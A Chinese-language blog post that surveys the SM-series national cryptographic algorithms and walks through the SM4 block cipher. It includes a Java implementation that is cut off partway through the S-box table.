        <content type="html"><![CDATA[<h1 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> <strong>背景</strong></h1><p>为了保障商用密码的安全性，国家商用密码管理办公室制定了一系列密码标准，包括SM1（SCB2）、SM2、SM3、SM4、SM7、SM9、祖冲之密码算法（ZUC)那等等。</p><p>其中SM1、SM4、SM7、祖冲之密码（ZUC）是对称算法；SM2、SM9是非对称算法；SM3是<a href="https://so.csdn.net/so/search?q=%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95&amp;spm=1001.2101.3001.7020">哈希算法</a>。目前，这些算法已广泛应用于各个领域中，期待有一天会有采用国密算法的区块链应用出现。</p><p>256</p><p>其中SM1、SM7算法不公开，调用该算法时，需要通过加密芯片的接口进行调用；比较少人了解这些算法，在这里对这些国密算法做简单的科普</p><h2 id="sm1对称密码"><a class="markdownIt-Anchor" href="#sm1对称密码"></a> <strong>SM1对称密码</strong></h2><p>SM1 算法是分组密码算法，分组长度为128位，密钥长度都为 128 比特，算法安全保密强度及相关软硬件实现性能与 AES 相当，算法不公开，仅以IP核的形式存在于芯片中。</p><h2 id="sm2椭圆曲线公钥密码算法"><a class="markdownIt-Anchor" href="#sm2椭圆曲线公钥密码算法"></a> <strong>SM2椭圆曲线公钥密码算法</strong></h2><p>SM2算法就是ECC椭圆曲线密码机制，但在签名、密钥交换方面不同于ECDSA、ECDH等国际标准，而是采取了更为安全的机制。另外，SM2推荐了一条256位的曲线作为标准曲线。<br />SM2标准包括总则，数字签名算法，密钥交换协议，公钥加密算法四个部分，并在每个部分的附录详细说明了实现的相关细节及示例。</p><p>SM2算法主要考虑素域Fp和F2m上的椭圆曲线，分别介绍了这两类域的表示，运算，以及域上的椭圆曲线的点的表示，运算和多倍点计算算法。然后介绍了编程语言中的数据转换，包括整数和字节串，字节串和比特串，域元素和比特串，域元素和整数，点和字节串之间的数据转换规则。</p><p>详细说明了有限域上椭圆曲线的参数生成以及验证，椭圆曲线的参数包括有限域的选取，椭圆曲线方程参数，椭圆曲线群基点的选取等，并给出了选取的标准以便于验证。最后给椭圆曲线上密钥对的生成以及公钥的验证，用户的密钥对为（s，sP），其中s为用户的私钥，sP为用户的公钥，由于离散对数问题从sP难以得到s，并针对素域和二元扩域给出了密钥对生成细节和验证方式。总则中的知识也适用于SM9算法。</p><p>在总则的基础上给出了数字签名算法（包括数字签名生成算法和验证算法），密钥交换协议以及公钥加密算法（包括加密算法和解密算法），并在每个部分给出了算法描述，算法流程和相关示例。<br />数字签名算法，密钥交换协议以及公钥加密算法都使用了国家密管理局批准的SM3密码杂凑算法和随机数发生器。数字签名算法，密钥交换协议以及公钥加密算法根据总则来选取有限域和椭圆曲线，并生成密钥对。<br />SM2算法在很多方面都优于RSA算法（RSA发展得早应用普遍，SM2领先也很自然），与RSA安全性对比如下图</p><p>1219</p><h2 id="sm3杂凑算法"><a class="markdownIt-Anchor" href="#sm3杂凑算法"></a> <strong>SM3杂凑算法</strong></h2><p>SM3密码杂凑（哈希、散列）算法给出了杂凑函数算法的计算方法和计算步骤，并给出了运算示例。此算法适用于商用密码应用中的数字签名和验证，消息认证码的生成与验证以及随机数的生成，可满足多种密码应用的安全需求。在SM2，SM9标准中使用。</p><p>此算法对输入长度小于2的64次方的比特消息，经过填充和迭代压缩，生成长度为256比特的杂凑值，其中使用了异或，模，模加，移位，与，或，非运算，由填充，迭代过程，消息扩展和压缩函数所构成。具体算法及运算示例见SM3标准。</p><h2 id="sm4对称算法"><a class="markdownIt-Anchor" href="#sm4对称算法"></a> <strong>SM4对称算法</strong></h2><p>此算法是一个分组算法，用于无线局域网产品。该算法的分组长度为128比特，密钥长度为128比特。加密算法与密钥扩展算法都采用32轮非线性迭代结构。解密算法与加密算法的结构相同，只是轮密钥的使用顺序相反，解密轮密钥是加密轮密钥的逆序。</p><p>此算法采用非线性迭代结构，每次迭代由一个轮函数给出，其中轮函数由一个非线性变换和线性变换复合而成，非线性变换由S盒所给出。其中rki为轮密钥，合成置换T组成轮函数。轮密钥的产生与上图流程类似，由加密密钥作为输入生成，轮函数中的线性变换不同，还有些参数的区别。SM4算法的具体描述和示例见SM4标准。</p><h2 id="sm7对称密码"><a class="markdownIt-Anchor" href="#sm7对称密码"></a> <strong>SM7对称密码</strong></h2><p>SM7算法，是一种分组密码算法，分组长度为128比特，密钥长度为128比特。SM7适用于非接触式IC卡，应用包括身份识别类应用(门禁卡、工作证、参赛证)，票务类应用(大型赛事门票、展会门票)，支付与通卡类应用（积分消费卡、校园一卡通、企业一卡通等）。</p><h2 id="sm9标识密码算法"><a class="markdownIt-Anchor" href="#sm9标识密码算法"></a> <strong>SM9标识密码算法</strong></h2><p>为了降低公开密钥系统中密钥和证书管理的复杂性，以色列科学家、RSA算法发明人之一Adi Shamir在1984年提出了标识密码（Identity-Based Cryptography）的理念。标识密码将用户的标识（如邮件地址、手机号码、QQ号码等）作为公钥，省略了交换数字证书和公钥过程，使得安全系统变得易于部署和管理，非常适合端对端离线安全通讯、云端数据加密、基于属性加密、基于策略加密的各种场合。2008年标识密码算法正式获得国家密码管理局颁发的商密算法型号：SM9(商密九号算法)，为我国标识密码技术的应用奠定了坚实的基础。</p><p>SM9算法不需要申请数字证书，适用于互联网应用的各种新兴应用的安全保障。如基于云技术的密码服务、电子邮件安全、智能终端保护、物联网安全、云存储安全等等。这些安全应用可采用手机号码或邮件地址作为公钥，实现数据加密、身份认证、通话加密、通道加密等安全应用，并具有使用方便，易于部署的特点，从而开启了普及密码算法的大门。</p><h2 id="zuc祖冲之算法"><a class="markdownIt-Anchor" href="#zuc祖冲之算法"></a> <strong>ZUC祖冲之算法</strong></h2><p>祖冲之序列密码算法是中国自主研究的流密码算法,是运用于移动通信4G网络中的国际标准密码算法,该算法包括祖冲之算法(ZUC)、加密算法(128-EEA3)和完整性算法(128-EIA3)三个部分。目前已有对ZUC算法的优化实现，有专门针对128-EEA3和128-EIA3的硬件实现与优化。</p><p>密码算法作为国家战略资源，比历史上任何时候都显得更为关键。在大数据和云计算的时代，关键信息往往通过数据挖掘技术在海量数据中获得，所以每一个人的信息保护都非常重要。</p><p><em>转载自<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.qukuaiwang.com.cn%2Fnews%2F2271.html">《科普一下SM系列国密算法（从零开始学区块链）》</a></em></p><h1 id="sm4算法"><a class="markdownIt-Anchor" href="#sm4算法"></a> <strong>SM4算法</strong></h1><p>参考链接:<a href="https://www.cnblogs.com/kentle/p/14135865.html">SM4加密算法原理和简单实现（java） - kentle - 博客园 (cnblogs.com)</a></p><p>比较推荐的视频教程:<a href="https://www.bilibili.com/video/BV1LS4y167r3/?spm_id_from=333.1007.top_right_bar_window_history.content.click&amp;vd_source=2dd928d1666db052f11478fedb530519">【SM4加密算法】| SMS4 | 对称加密| 分组加密| 国密| 密码学| 信息安全|_哔哩哔哩_bilibili</a></p><p>SM4是一种分组密码算法，其<strong>分组长度为128位</strong>（即<strong>16字节</strong>，<strong>4字</strong>），<strong>密钥长度也为128位</strong>（即<strong>16字节</strong>，<strong>4字</strong>）。其加解密过程采用了<strong>32轮</strong>迭代机制（与DES、AES类似），每一轮需要一个轮密钥（与DES、AES类似）。</p><p>SM4 文档：<a href="http://www.gmbz.org.cn/main/viewfile/20180108015408199368.html">http://www.gmbz.org.cn/main/viewfile/20180108015408199368.html</a></p><p>左边为加密流程，右边为密钥拓展算法</p><p>3329</p><h2 id="加密流程"><a class="markdownIt-Anchor" href="#加密流程"></a> <strong>加密流程</strong></h2><h3 id="1-加解密"><a class="markdownIt-Anchor" href="#1-加解密"></a> (1) <strong>加解密</strong></h3><p>3416</p><h3 id="2-密钥拓展"><a class="markdownIt-Anchor" href="#2-密钥拓展"></a> (2) <strong>密钥拓展</strong></h3><p>3491</p><h3 id="3-sm4-的逆运算"><a class="markdownIt-Anchor" href="#3-sm4-的逆运算"></a> (3) <strong>SM4 的逆运算</strong></h3><p>3570</p><h3 id="代码实现java版"><a class="markdownIt-Anchor" href="#代码实现java版"></a> <strong>代码实现(Java版)</strong></h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SM4</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key_r<span class="token punctuation">;</span>    <span class="token comment">/* 初始化轮密钥 */</span>    <span class="token function">SM4</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>key_r <span class="token operator">=</span> <span class="token function">keyGenerate</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 密钥拓展 */</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">keyGenerate</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key_r <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//轮密钥rk_i</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key_temp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> box_in<span class="token punctuation">,</span> box_out<span class="token punctuation">;</span><span class="token comment">//盒变换输入输出</span>        <span class="token keyword">final</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token constant">FK</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xa3b1bac6</span><span class="token punctuation">,</span> <span class="token number">0x56aa3350</span><span class="token punctuation">,</span> <span class="token number">0x677d9197</span><span class="token punctuation">,</span> <span class="token number">0xb27022dc</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token constant">CK</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token number">0x00070e15</span><span class="token punctuation">,</span> <span class="token number">0x1c232a31</span><span class="token punctuation">,</span> <span class="token number">0x383f464d</span><span class="token punctuation">,</span> <span class="token number">0x545b6269</span><span class="token punctuation">,</span>                <span class="token number">0x70777e85</span><span class="token punctuation">,</span> <span class="token number">0x8c939aa1</span><span class="token punctuation">,</span> <span class="token number">0xa8afb6bd</span><span class="token punctuation">,</span> <span class="token number">0xc4cbd2d9</span><span class="token punctuation">,</span>                <span class="token number">0xe0e7eef5</span><span class="token punctuation">,</span> <span class="token number">0xfc030a11</span><span class="token punctuation">,</span> <span class="token number">0x181f262d</span><span class="token punctuation">,</span> <span class="token number">0x343b4249</span><span class="token punctuation">,</span>                <span class="token number">0x50575e65</span><span class="token punctuation">,</span> <span class="token number">0x6c737a81</span><span class="token punctuation">,</span> <span class="token number">0x888f969d</span><span class="token punctuation">,</span> <span class="token number">0xa4abb2b9</span><span class="token punctuation">,</span>                <span class="token number">0xc0c7ced5</span><span class="token punctuation">,</span> <span class="token number">0xdce3eaf1</span><span class="token punctuation">,</span> <span class="token number">0xf8ff060d</span><span class="token punctuation">,</span> <span class="token number">0x141b2229</span><span class="token punctuation">,</span>                <span class="token number">0x30373e45</span><span class="token punctuation">,</span> <span class="token number">0x4c535a61</span><span class="token punctuation">,</span> <span class="token number">0x686f767d</span><span class="token punctuation">,</span> <span class="token number">0x848b9299</span><span class="token punctuation">,</span>                <span class="token number">0xa0a7aeb5</span><span class="token punctuation">,</span> <span class="token number">0xbcc3cad1</span><span class="token punctuation">,</span> <span class="token number">0xd8dfe6ed</span><span class="token punctuation">,</span> <span class="token number">0xf4fb0209</span><span class="token punctuation">,</span>                <span class="token number">0x10171e25</span><span class="token punctuation">,</span> <span class="token number">0x2c333a41</span><span class="token punctuation">,</span> <span class="token number">0x484f565d</span><span class="token punctuation">,</span> <span class="token number">0x646b7279</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">//将输入的密钥每32比特合并，并异或FK</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            key_temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">jointBytes</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            key_temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key_temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token constant">FK</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//32轮密钥拓展</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            box_in <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key_temp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> key_temp<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token constant">CK</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            box_out <span class="token operator">=</span> <span class="token function">sBox</span><span class="token punctuation">(</span>box_in<span class="token punctuation">)</span><span class="token punctuation">;</span>            key_r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> box_out <span class="token operator">^</span> <span class="token function">shift</span><span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">shift</span><span class="token punctuation">(</span>box_out<span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            key_temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            key_temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            key_temp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> key_temp<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            key_temp<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> key_r<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> key_r<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 加解密主模块 */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">sm4Main</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> input<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key_r<span class="token punctuation">,</span> <span class="token keyword">int</span> mod<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> text <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//32比特字</span>        <span class="token comment">//将输入以32比特分组</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            text<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">jointBytes</span><span class="token punctuation">(</span>input<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> input<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> input<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> input<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">int</span> box_input<span class="token punctuation">,</span> box_output<span class="token punctuation">;</span><span class="token comment">//盒变换输入和输出</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token punctuation">(</span>mod <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> i <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过改变key_r的顺序改变模式</span>            box_input <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> text<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> text<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">^</span> key_r<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>            box_output <span class="token operator">=</span> <span class="token function">sBox</span><span class="token punctuation">(</span>box_input<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> box_output <span class="token operator">^</span> <span class="token function">shift</span><span class="token punctuation">(</span>box_output<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">shift</span><span class="token punctuation">(</span>box_output<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">shift</span><span class="token punctuation">(</span>box_output<span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">shift</span><span class="token punctuation">(</span>box_output<span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            text<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            text<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            text<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            text<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//输出</span>        <span class="token comment">//将结果的32比特字拆分</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span><span class="token function">splitInt</span><span class="token punctuation">(</span>text<span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> output<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> output<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 加密 */</span>    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> plaintext<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">sm4Main</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> key_r<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 解密 */</span>    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ciphertext<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">sm4Main</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key_r<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 将32比特数拆分成4个8比特数 */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">splitInt</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token operator">>>></span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token operator">>>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token operator">>>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> n<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 将4个8比特数合并成32比特数 */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">jointBytes</span><span class="token punctuation">(</span><span class="token keyword">byte</span> byte_0<span class="token punctuation">,</span> <span class="token keyword">byte</span> byte_1<span class="token punctuation">,</span> <span class="token keyword">byte</span> byte_2<span class="token punctuation">,</span> <span class="token keyword">byte</span> byte_3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>byte_0 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>byte_1 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>byte_2 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>byte_3 <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">/* S盒变换 */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">sBox</span><span class="token punctuation">(</span><span class="token keyword">int</span> box_input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//s盒的参数</span>        <span class="token keyword">final</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token constant">SBOX</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span>                <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span>                <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token 